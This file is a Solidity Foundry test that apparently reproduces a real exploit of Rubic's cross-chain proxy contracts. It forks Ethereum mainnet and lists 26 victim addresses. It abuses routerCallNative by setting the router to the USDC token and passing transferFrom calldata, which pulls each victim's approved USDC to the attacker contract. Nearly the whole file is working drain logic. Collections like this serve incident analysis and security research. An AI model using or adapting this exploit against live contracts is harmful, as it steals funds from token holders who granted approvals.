// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1606993118901198849
// https://twitter.com/peckshield/status/1606937055761952770
// @TX
// https://etherscan.io/tx/0x9a97d85642f956ad7a6b852cf7bed6f9669e2c2815f3279855acf7f1328e7d46

interface RubicProxy1 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;
}

interface RubicProxy2 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(
        string calldata _providerInfo,
        BaseCrossChainParams calldata _params,
        bytes calldata _data
    ) external;
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    RubicProxy1 Rubic1 = RubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);
    RubicProxy2 Rubic2 = RubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);
    address integrators = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_260_580);
    }

    function testExploit() external {
        address[] memory victims = new address[](26);
        victims[0] = 0x6b8D6E89590E41Fa7484691fA372c3552E93e91b;
        victims[1] = 0x036B5805F9175297Ec2adE91678d6ea0a1e2272A;
        victims[2] = 0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0;
        victims[3] = 0xff266f62a0152F39FCf123B7086012cEb292516A;
        victims[4] = 0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D;
        victims[5] = 0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B;
        victims[6] = 0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981;
        victims[7] = 0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a;
        victims[8] = 0x915E88322EDFa596d29BdF163b5197c53cDB1A68;
        victims[9] = 0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5;
        victims[10] = 0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA;
        victims[11] = 0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb;
        victims[12] = 0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1;
        victims[13] = 0x58709C660B2d908098FE95758C8a872a3CaA6635;
        victims[14] = 0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9;
        victims[15] = 0xfE243903c13B53A57376D27CA91360C6E6b3FfAC;
        victims[16] = 0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1;
        victims[17] = 0xd6389E37f7c2dB6De56b92f430735D08d702111E;
        victims[18] = 0x9f3119BEe3766b2CD25BF3808a8646A7F22ccDDC;
        victims[19] = 0x8a4295b205DD78Bf3948D2D38a08BaAD4D28CB37;
        victims[20] = 0xf4BA068f3F79aCBf148b43ae8F1db31F04E53861;
        victims[21] = 0x48327499E4D71ED983DC7E024DdEd4EBB19BDb28;
        victims[22] = 0x192FcF067D36a8BC9322b96Bb66866c52C43B43F;
        victims[23] = 0x82Bdfc6aBe9d1dfA205f33869e1eADb729590805;
        victims[24] = 0x44a59A1d38718c5cA8cB6E8AA7956859D947344B;
        victims[25] = 0xD0245a08f5f5c54A24907249651bEE39F3fE7014;

        RubicProxy1.BaseCrossChainParams memory _params1 = RubicProxy1.BaseCrossChainParams({
            srcInputToken: address(0),
            srcInputAmount: 0,
            dstChainID: 0,
            dstOutputToken: address(0),
            dstMinOutputAmount: 0,
            recipient: address(0),
            integrator: integrators,
            router: address(USDC)
        });
        RubicProxy2.BaseCrossChainParams memory _params2 = RubicProxy2.BaseCrossChainParams({
            srcInputToken: address(0),
            srcInputAmount: 0,
            dstChainID: 0,
            dstOutputToken: address(0),
            dstMinOutputAmount: 0,
            recipient: address(0),
            integrator: integrators,
            router: address(USDC)
        });
        uint256 amount;
        for (uint256 i = 0; i < 8; i++) {
            uint256 victimsBalance = USDC.balanceOf(victims[i]);
            uint256 victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic1));
            amount = victimsBalance;
            if (victimsBalance >= victimsAllowance) {
                amount = victimsAllowance;
            }
            bytes memory data =
                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), amount);
            Rubic1.routerCallNative(_params1, data);
        }
        for (uint256 i = 8; i < victims.length; i++) {
            uint256 victimsBalance = USDC.balanceOf(victims[i]);
            uint256 victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic2));
            amount = victimsBalance;
            if (victimsBalance >= victimsAllowance) {
                amount = victimsAllowance;
            }
            bytes memory data =
                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), amount);
            Rubic2.routerCallNative("", _params2, data);
        }

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }
}
